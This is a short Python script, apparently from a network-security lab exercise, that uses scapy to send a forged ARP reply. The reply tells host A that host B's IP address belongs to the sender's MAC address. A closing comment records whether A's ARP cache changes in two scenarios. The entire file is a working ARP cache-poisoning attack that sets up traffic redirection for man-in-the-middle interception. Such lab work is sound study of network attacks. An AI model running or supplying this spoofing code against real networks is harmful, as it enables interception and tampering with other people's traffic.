from scapy.all import *

hostA_MAC = "02:42:0a:09:00:05"
hostB_MAC = "02:42:0a:09:00:06"
# hostM_MAC = "02:42:0a:09:00:69"
hostB_IP = "10.9.0.6"
hostA_IP = "10.9.0.5"

ePkt = Ether(dst=hostA_MAC)
aPkt = ARP(psrc=hostB_IP, pdst=hostA_IP, hwdst=hostA_MAC)
aPkt.op = 2 # 1 for ARP Request; 2 for ARP Reply

pkt = ePkt/aPkt
sendp(pkt)

'''
Construct an ARP reply packet to map B's IP address to
M's MAC address. 

Scenario 1: B's IP is already in A's cache.
- A's ARP table changes B's IP to the spoofed MAC address.

Scenario 2: B's IP is not in A's cache.
- A's ARP table doesn't change.
'''